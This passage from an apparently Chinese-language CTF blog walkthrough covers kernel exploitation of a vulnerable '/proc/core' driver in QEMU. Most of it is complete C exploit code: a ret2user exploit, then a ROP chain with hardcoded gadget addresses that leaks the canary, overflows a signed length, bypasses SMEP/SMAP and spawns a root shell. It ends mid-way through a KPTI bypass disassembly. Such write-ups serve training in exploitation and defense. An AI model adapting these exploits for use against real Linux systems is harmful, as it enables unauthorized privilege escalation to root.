class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*prepare_kernel_cred)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) KERNCALL = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> user_rip;</span><br><span class="line">    <span class="type">size_t</span> user_cs;</span><br><span class="line">    <span class="type">size_t</span> user_rflags;</span><br><span class="line">    <span class="type">size_t</span> user_sp;</span><br><span class="line">    <span class="type">size_t</span> user_ss;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss, tf_addr = (<span class="type">size_t</span>) &amp;tf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    tf.user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    tf.user_cs = user_cs;</span><br><span class="line">    tf.user_rflags = user_rflags;</span><br><span class="line">    tf.user_sp = user_sp - <span class="number">0x1000</span>;</span><br><span class="line">    tf.user_ss = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    <span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsp, tf_addr;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + offset);</span><br><span class="line">            prepare_kernel_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) prepare_kernel_cred + offset);</span><br><span class="line">            init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + offset);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    rebase();</span><br><span class="line">    save_status();</span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line">    *(<span class="type">void</span> **) &amp;buf[<span class="number">80</span>] = get_root;</span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="comment">// jg 有符号判断，判其为负数，qmemcpy() 第三个参数取其后16位，导致溢出。</span></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="kernel-rop-without-KPIT"><a href="#kernel-rop-without-KPIT" class="headerlink" title="kernel rop without KPIT"></a>kernel rop without KPIT</h2><p>开启 smep 和 smap 保护后，内核空间无法执行用户空间的代码，并且无法访问用户空间的数据。因此不能直接 ret2user 。利用 ROP ，执行 <code>commit_creds(prepare_kernel_cred(0))</code> , 然后 <code>iret</code> 返回用户空间可以绕过上述保护。</p>
<p>添加 <code>smep</code> 和 <code>smap</code> 保护。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure></div>

<p>由于找不到 <code>mov rdi, rax; ret;</code> 这条 <code>gadget</code> ，因此需要用 <code>mov rdi, rax; call rdx;</code> 代替，其中 <code>rdx</code> 指向 <code>pop rcx; ret;</code> 可以清除 <code>call</code> 指令压入栈中的 <code>rip</code> ，因此相当于 <code>ret</code> 。</p>
<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>从 <code>/tmp/kallsyms</code> 读取符号地址，确认与<code>nokaslr</code>偏移，从vmlinux寻找<code>gadget</code>。</li>
<li>保存用户状态。</li>
<li>通过设置 <code>off</code> 读取 <code>canary</code>。</li>
<li>于内核空间 <code>rop</code> 调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>提权。</li>
<li>通过 <code>swapgs; popfq; ret;</code> ，<code>iretq</code> 返回用户空间，并执行 <code>system(&quot;/bin/sh&quot;);</code>。</li>
</ol>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// from vmlinux</span></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xFFFFFFFF8109CCE0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF8109C8E0</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF8223D1A0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff81000b2f</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdx_ret = <span class="number">0xffffffff810a0f49</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rcx_ret = <span class="number">0xffffffff81021e53</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0xffffffff8101aa6a</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_popfq_ret = <span class="number">0xffffffff81a012da</span>;</span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff81050ac2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> core_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">size_t</span> off)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    ioctl(core_fd, <span class="number">0x6677889A</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_write</span><span class="params">(<span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    write(core_fd, buf, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rebase</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open kallsyms.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(kallsyms_fd, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, name)) &#123;</span><br><span class="line">        <span class="type">size_t</span> offset = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) commit_creds;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            offset = addr - (<span class="type">size_t</span>) prepare_kernel_cred;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (offset != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] offset: %p\n&quot;</span>, offset);</span><br><span class="line">            commit_creds += offset;</span><br><span class="line">            prepare_kernel_cred += offset;</span><br><span class="line">            init_cred += offset;</span><br><span class="line">            pop_rdi_ret += offset;</span><br><span class="line">            pop_rdx_ret += offset;</span><br><span class="line">            pop_rcx_ret += offset;</span><br><span class="line">            mov_rdi_rax_call_rdx += offset;</span><br><span class="line">            swapgs_popfq_ret += offset;</span><br><span class="line">            iretq += offset;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] commit_creds: %p\n&quot;</span>, (<span class="type">size_t</span>) commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] prepare_kernel_cred: %p\n&quot;</span>, (<span class="type">size_t</span>) prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">get_canary</span><span class="params">()</span> &#123;</span><br><span class="line">    set_off(<span class="number">64</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">    core_read(buf);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">size_t</span> *) buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    rebase();</span><br><span class="line"></span><br><span class="line">    core_fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (core_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open core.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    *(<span class="type">size_t</span> *) &amp;buf[<span class="number">64</span>] = canary;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *rop = (<span class="type">size_t</span> *) &amp;buf[<span class="number">80</span>], it = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    rop[it++] = pop_rdi_ret;</span></span><br><span class="line"><span class="comment">//    rop[it++] = init_cred;</span></span><br><span class="line"><span class="comment">//    rop[it++] = commit_creds;</span></span><br><span class="line">    </span><br><span class="line">    rop[it++] = pop_rdi_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = prepare_kernel_cred;</span><br><span class="line">    rop[it++] = pop_rdx_ret; <span class="comment">// rdx ==&gt; pop_rcx_ret_addr</span></span><br><span class="line">    rop[it++] = pop_rcx_ret;</span><br><span class="line">    <span class="comment">// rax==prepare_kernel_cred(0), cal rdx ==&gt; push commit_creds_addr, then pop_rcx_ret</span></span><br><span class="line">    rop[it++] = mov_rdi_rax_call_rdx; </span><br><span class="line">    rop[it++] = commit_creds;</span><br><span class="line">    </span><br><span class="line">    rop[it++] = swapgs_popfq_ret;</span><br><span class="line">    rop[it++] = <span class="number">0</span>;</span><br><span class="line">    rop[it++] = iretq;</span><br><span class="line">    rop[it++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[it++] = user_cs;</span><br><span class="line">    rop[it++] = user_rflags;</span><br><span class="line">    rop[it++] = user_sp;</span><br><span class="line">    rop[it++] = user_ss;</span><br><span class="line"></span><br><span class="line">    core_write(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    core_copy_func(<span class="number">0xffffffffffff0000</span> | <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="kernel-rop-with-KPIT"><a href="#kernel-rop-with-KPIT" class="headerlink" title="kernel rop with KPIT"></a>kernel rop with KPIT</h2><p>开启 kpti</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 256M \</span><br><span class="line">  -kernel ./bzImage \</span><br><span class="line">  -initrd ./core.cpio \</span><br><span class="line">  -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot;</span> \</span><br><span class="line">  -s \</span><br><span class="line">  -netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -cpu kvm64,+smep,+smap</span><br></pre></td></tr></table></figure></div>

<h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>此时需要借助 <code>swapgs_restore_regs_and_return_to_usermode</code> 返回用户态。该函数是内核在 <code>arch/x86/entry/entry_64.S</code> 中提供的一个用于完成内核态到用户态切换的函数。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81A008DA ; __int64 swapgs_restore_regs_and_return_to_usermode(void)</span><br><span class="line">.text:FFFFFFFF81A008DA                 public swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">.text:FFFFFFFF81A008DA swapgs_restore_regs_and_return_to_usermode proc near</span><br><span class="line">.text:FFFFFFFF81A008DA                                         ; CODE XREF: ;entry_SYSCALL_64_after_hwframe+4D↑j</span><br><span class="line">.text:FFFFFFFF81A008DA                                         ; entry_SYSCALL_64_after_hwframe+5E↑j ...</span><br><span class="line">.text:FFFFFFFF81A008DA                 pop     r15</span><br><span class="line">.text:FFFFFFFF81A008DC                 pop     r14</span><br><span class="line">.text:FFFFFFFF81A008DE                 pop     r13</span><br><span class="line">.text:FFFFFFFF81A008E0                 pop     r12</span><br><span class="line">.text:FFFFFFFF81A008E2                 pop     rbp</span><br><span class="line">.text:FFFFFFFF81A008E3                 pop     rbx</span><br><span class="line">.text:FFFFFFFF81A008E4                 pop     r11</span><br><span class="line">.text:FFFFFFFF81A008E6                 pop     r10</span><br><span class="line">.text:FFFFFFFF81A008E8                 pop     r9</span><br><span class="line">.text:FFFFFFFF81A008EA                 pop     r8</span><br><span class="line">.text:FFFFFFFF81A008EC                 pop     rax</span><br><span class="line">.text:FFFFFFFF81A008ED                 pop     rcx</span><br><span class="line">.text:FFFFFFFF81A008EE                 pop     rdx</span><br><span class="line">.text:FFFFFFFF81A008EF                 pop     rsi</span><br><span class="line">.text:FFFFFFFF81A008F0                 mov     rdi, rsp ; jump this</span><br><span class="line">.text:FFFFFFFF81A008F3                 mov     rsp, gs:qword_5004</span><br><span class="line">.text:FFFFFFFF81A008FC                 push    qword ptr [rdi+30h]</span><br><span class="line">.text:FFFFFFFF81A008FF                 push    qword ptr [rdi+28h]</span><br><span class="line">.text:FFFFFFFF81A00902                 push    qword ptr [rdi+20h]</span><br><span class="line">.text:FFFFFFFF81A00905                 push    qword ptr [rdi+18h]</span><br><span class="line">.text:FFFFFFFF81A00908                 push    qword ptr [rdi+10h]</span><br><span class="line">.text:FFFFFFFF81A0090B                 push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81A0090D                 push    rax</span><br><span class="line">.text:FFFFFFFF81A0090E                 jmp     short loc_FFFFFFFF81A00953</span><br><span class="line">[......]</span><br><span class="line">;loc_FFFFFFFF81A00953</span><br><span class="line">.text:FFFFFFFF81A00953 loc_FFFFFFFF81A00953:                   ; CODE XREF: ;swapgs_restore_regs_and_return_to_usermode+34↑j</span><br><span class="line">.text:FFFFFFFF81A00953                 pop     rax</span><br><span 